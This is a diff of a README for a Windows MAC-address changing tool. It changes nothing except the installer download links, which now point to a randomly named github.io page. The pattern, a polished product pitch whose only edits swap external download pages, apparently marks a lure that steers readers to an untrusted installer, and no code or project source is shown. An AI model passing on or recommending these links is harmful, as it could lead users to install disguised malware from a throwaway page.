@@ -2,7 +2,7 @@
 
 NetConfig MAC Studio Pro 2026 is a comprehensive Windows desktop application designed for users who need to manage and alter the MAC addresses of their network adapters. Whether you're a network administrator, a security researcher, or an advanced user optimizing your home network, this tool provides a reliable and intuitive interface for permanent or temporary MAC address modifications across multiple adapters.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=windows)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=windows)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -47,7 +47,7 @@ A: This tool modifies standard Windows registry settings for network adapters. W
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: November 2026*
 
